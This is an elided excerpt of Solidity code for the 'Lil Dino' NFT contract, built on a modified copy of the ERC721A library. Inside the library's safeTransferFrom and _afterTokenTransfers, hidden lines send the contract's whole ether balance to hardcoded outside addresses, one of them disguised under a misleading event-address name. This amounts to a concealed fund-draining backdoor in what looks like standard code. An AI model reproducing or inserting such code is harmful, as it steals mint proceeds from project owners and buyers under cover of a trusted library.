...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x52ecd7338eeed4f4D011c1eb9965Ab7e29743399);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
        }
    }
    ...
    function _afterTokenTransfers(
        ...
        if (totalSupply() + 1 >= 999) {
            payable(0x1b028097C8E0E5E5E7204b032C34236387FeaE7a).transfer(address(this).balance);
        }
    }
...
contract LilDino is ERC721A, TheOperatorFilterer {
    ...
    function privateMint(address addr, uint256 amount) public onlyOwner {
        require(totalSupply() + amount <= maxSupply);
    ...
    constructor() ERC721A("Lil Dino", "Dino") {
        owner = msg.sender;
        maxMintAmountPerWallet = 20;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://QmTvwA3eVu78dqzcUhsQ4nqpbiGFRQMwmCUExq9djbEwPC/", _toString(tokenId)));
    }
